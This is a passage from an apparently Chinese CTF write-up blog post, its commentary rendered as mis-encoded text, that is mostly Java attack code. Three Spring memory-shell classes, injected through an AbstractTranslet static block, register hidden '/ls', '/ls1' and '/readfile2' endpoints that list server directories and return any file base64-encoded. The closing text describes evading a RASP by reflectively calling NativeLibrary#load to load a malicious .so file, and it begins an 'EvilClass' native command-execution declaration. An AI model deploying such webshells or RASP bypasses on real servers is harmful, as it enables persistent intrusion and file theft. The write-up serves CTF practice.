class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">"ls"</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">"/ls"</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }<span class="keyword">catch</span> (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">"dir"</span>); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">for</span> (File file : files) {</span><br><span class="line">                    <span class="keyword">if</span> (file.isFile()) {</span><br><span class="line">                        response.getWriter().write(<span class="string">"File: "</span> + file.getAbsolutePath());</span><br><span class="line">                    } <span class="keyword">else</span> <span class="keyword">if</span> (file.isDirectory()) {</span><br><span class="line">                        response.getWriter().write(<span class="string">"Directory: "</span> + file.getAbsolutePath());</span><br><span class="line">                        listFilesAndDirectories(file,response); <span class="comment">// é€’å½’éå†å­ç›®å½•</span></span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>è¿™æ ·çš„ç¼ºç‚¹æ˜¯åˆ—å‡ºæ ¹ç›®å½•çš„æ—¶å€™å¤ªå¤šæ‚ç¢çš„ä¸œè¥¿ï¼ŒğŸ‘´çœ‹ä¸åŠ¨ï¼Œè¦ä¸æ˜¯ğŸ‘´çŸ¥é“ /home ä¸‹é¢æœ‰ä¸œè¥¿ï¼Œè¿™ç©æ„å¤ªéš¾æ‰¾äº†.</p>
<p>ä¼˜åŒ–ä¸€ä¸‹</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">"ls1"</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">"/ls1"</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }<span class="keyword">catch</span> (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls1</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">"dir"</span>); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">for</span> (File file : files) {</span><br><span class="line">                    <span class="keyword">if</span> (file!=<span class="literal">null</span>) {</span><br><span class="line">                        response.getWriter().write(file.getAbsolutePath()+<span class="string">"\r\n"</span>);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112020.png" alt="å¾®ä¿¡æˆªå›¾_20231106112020"></p>
<p>è¿™æ ·çœ‹èµ·æ¥èˆ’æœå¤šäº†ï¼ŒğŸ‘´å¾ˆä¸­æ„ğŸ˜Š</p>
<h3 id="è¯»æ–‡ä»¶"><a class="markdownIt-Anchor" href="#è¯»æ–‡ä»¶">#</a> è¯»æ–‡ä»¶</h3>
<p>ğŸ‘´æƒ³å°è¯•æŸç’æ¯çš„ä»£ç ï¼Œç›´æ¥é€šè¿‡ <code>ResponseEntity</code>  ä¸‹è½½æ–‡ä»¶ï¼Œå¾ˆå¯æƒœï¼Œå¤±è´¥äº†ï¼Œä½†æ˜¯æ¶‰åŠåˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„è¯»å–ï¼Œæ€ä¹ˆåŠï¼ŒğŸ‘´ç”¨ base64 è¯»å‡ºæ¥ï¼ŒğŸ‘´çœŸ tm æ˜¯å®Œç¾å¤©æ‰çš„ idol (bushi)</p>
<p>ç»ˆäºğŸ‘´æƒ³æ˜ç™½äº†ä¸€ä»¶äº‹ï¼Œå†™å‡ºäº†å†…å­˜ğŸ</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exre</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exre.class.getMethod(<span class="string">"readfile2"</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">"/readfile2"</span>).options(config).build();</span><br><span class="line">            <span class="type">exre</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exre</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }<span class="keyword">catch</span> (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readfile2</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getParameter(<span class="string">"filepath"</span>);</span><br><span class="line">            <span class="keyword">if</span>(filePath!=<span class="literal">null</span>){</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">                <span class="type">byte</span>[] fileBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">                fileInputStream.read(fileBytes);</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">                response.getWriter().write(base64String);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>ä»€ä¹ˆï¼Œä½ è¯´ä½ ä¸ä¼š base64 è½¬æˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŸğŸ¤£</p>
<p>è‡ªå·±å†™ä¸ªè„šæœ¬è½¬æ¢éƒ½è¡Œï¼ŒğŸ‘´å‘Šè¯‰ä½ ï¼Œè¿˜èƒ½ä¸Š cyberchef è½¬æ¢ï¼Œè¿˜èƒ½å¯¼å‡ºä¸ºæ–‡ä»¶ğŸ˜…</p>
<h2 id="rasp"><a class="markdownIt-Anchor" href="#rasp">#</a> RASPğŸ˜…ğŸ˜¡</h2>
<p>ç»•è¿‡ content-length å°±ç®€å•äº†ï¼Ÿ8 å¯èƒ½ï¼</p>
<p>nmb ç”šè‡³æœ‰ RASP,âˆšâ…§,ğŸ‘´æ²¡å­¦è¿‡.</p>
<h3 id="å•¥äº‹-rasp"><a class="markdownIt-Anchor" href="#å•¥äº‹rasp">#</a> å•¥äº‹ RASP</h3>
<p>åœ¨ 2012 å¹´çš„æ—¶å€™ï¼ŒGartner å¼•å…¥äº† <code>Runtime application self-protection</code>  ä¸€è¯ï¼Œç®€ç§°ä¸º RASPã€‚å®ƒæ˜¯ä¸€ç§æ–°å‹åº”ç”¨å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒå°†ä¿æŠ¤ç¨‹åºåƒç–«è‹—ä¸€æ ·æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œåº”ç”¨ç¨‹åºèä¸ºä¸€ä½“ï¼Œèƒ½å®æ—¶æ£€æµ‹å’Œé˜»æ–­å®‰å…¨æ”»å‡»ï¼Œä½¿åº”ç”¨ç¨‹åºå…·å¤‡è‡ªæˆ‘ä¿æŠ¤èƒ½åŠ›ï¼Œå½“åº”ç”¨ç¨‹åºé­å—åˆ°å®é™…æ”»å‡»ä¼¤å®³ï¼Œå°±å¯ä»¥è‡ªåŠ¨å¯¹å…¶è¿›è¡Œé˜²å¾¡ï¼Œè€Œä¸éœ€è¦è¿›è¡Œäººå·¥å¹²é¢„ã€‚</p>
<p>RASP æŠ€æœ¯å¯ä»¥å¿«é€Ÿçš„å°†å®‰å…¨é˜²å¾¡åŠŸèƒ½æ•´åˆåˆ°æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­ï¼Œå®ƒæ‹¦æˆªä»åº”ç”¨ç¨‹åºåˆ°ç³»ç»Ÿçš„æ‰€æœ‰è°ƒç”¨ï¼Œç¡®ä¿å®ƒä»¬æ˜¯å®‰å…¨çš„ï¼Œå¹¶ç›´æ¥åœ¨åº”ç”¨ç¨‹åºå†…éªŒè¯æ•°æ®è¯·æ±‚ã€‚Web å’Œé Web åº”ç”¨ç¨‹åºéƒ½å¯ä»¥é€šè¿‡ RASP è¿›è¡Œä¿æŠ¤ã€‚è¯¥æŠ€æœ¯ä¸ä¼šå½±å“åº”ç”¨ç¨‹åºçš„è®¾è®¡ï¼Œå› ä¸º RASP çš„æ£€æµ‹å’Œä¿æŠ¤åŠŸèƒ½æ˜¯åœ¨åº”ç”¨ç¨‹åºè¿è¡Œçš„ç³»ç»Ÿä¸Šè¿è¡Œçš„ã€‚</p>
<p>ğŸ‘´è¯´äººè¯ï¼šå°±æ˜¯ nm æŠŠå†…å­˜è¿‡æ»¤ï¼Œå®æ—¶åŠ¨æ€é˜²æŠ¤ã€‚åˆ«äººå«å†…å­˜é©¬ï¼Œä½ å«å†…å­˜ç›¾.</p>
<p>è‡³äºè¿™ç©æ„ï¼ŒğŸ‘´å°±ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†ï¼Œå…ˆç­‰ğŸ‘´æ–°å¼€ä¸ªæ–‡ç« ï¼Œè®°å½•ä¸€ä¸‹ RASP çš„å­¦ä¹ ç¬”è®°.</p>
<p>ğŸ‘´å›æ¥äº†ï¼Œåˆ°äº†æœ€åçš„æ­¥éª¤äº†., çœ‹ğŸ‘´ç»•è¿‡è¿™è¯¥æ­»çš„ RASP.</p>
<p>é€šè¿‡ java-agent æ’æ¡©æŠ€æœ¯ï¼Œhook ä½äº†ä¸€äº›åº•å±‚çš„ç±»ï¼Œä½¿å¾— java çš„ exec ä¸èƒ½å¤Ÿæ‰§è¡Œ</p>
<p>ä¸€èˆ¬æ˜¯ unix æˆ–è¿™ forkandexec</p>
<p><code>forkAndExec</code>  é€šå¸¸æ˜¯ä¸æ“ä½œç³»ç»Ÿè¿›ç¨‹ç®¡ç†ç›¸å…³çš„æ“ä½œï¼Œç”¨äºåœ¨ç±» Unix æ“ä½œç³»ç»Ÿä¸­ï¼ˆå¦‚ Linuxï¼‰åˆ›å»ºå­è¿›ç¨‹å¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚</p>
<p>å¯æ¶çš„ RASP hook ä½äº†è¿™äº›ç±»</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112422.png" alt="å¾®ä¿¡æˆªå›¾_20231106112422"></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112531.png" alt="å¾®ä¿¡æˆªå›¾_20231106112531"></p>
<p>ç”šè‡³è¿˜ä¸è®©æœ¬åœ° JNI åŠ è½½äº†ï¼Œ <code>loadLibrary0</code>  ä¹Ÿè¢« hook äº†</p>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a class="markdownIt-Anchor" href="#è§£å†³æ–¹æ¡ˆ">#</a> è§£å†³æ–¹æ¡ˆğŸ˜’</h2>
<p>åº•å±‚çš„ native æ–¹æ³•  <code>java.lang.ClassLoader.NativeLibrary#load</code>  å¹¶æœªè¢« hookï¼Œå¹¶ä¸”åå°„ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨åå°„æ¥è°ƒç”¨  <code>java.lang.ClassLoader.NativeLibrary</code>  ä¸­çš„  <code>load</code>  æ–¹æ³•æ¥åŠ è½½æ¶æ„ so æ–‡ä»¶æ‰§è¡Œå‘½ä»¤</p>
<p>èˆ¹æ–°å§¿åŠ¿ä¹‹ <code>javah</code></p>
<p>å¯ä»¥ï¼Œæˆ‘å°±å–œæ¬¢ hğŸ˜Š</p>
<p><code>javah</code>  æ˜¯ Java å¼€å‘å·¥å…·åŒ… (JDK) æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç”Ÿæˆ Java ç±»çš„æœ¬åœ°æ–¹æ³•æ¥å£ (Native Method Interface, JNI) å¤´æ–‡ä»¶ã€‚JNI å…è®¸ Java ä»£ç ä¸æœ¬åœ°ï¼ˆé€šå¸¸æ˜¯ C æˆ– C++ï¼‰ä»£ç è¿›è¡Œäº¤äº’ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ä¸ç¡¬ä»¶äº¤äº’æˆ–ä¸ç°æœ‰çš„æœ¬åœ°åº“è¿›è¡Œé›†æˆã€‚</p>
<p>ç¼–å†™åŒ…å«æœ¬åœ°æ–¹æ³•å£°æ˜çš„ Java ç±»ï¼Œä½¿ç”¨  <code>native</code>  å…³é”®å­—å£°æ˜æœ¬åœ°æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span>  {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>ç„¶åä½¿ç”¨ javac ç¼–è¯‘æˆ class, ç„¶åä½¿ç”¨ javah ç¼–è¯‘æˆ h æ–‡ä»¶</p>
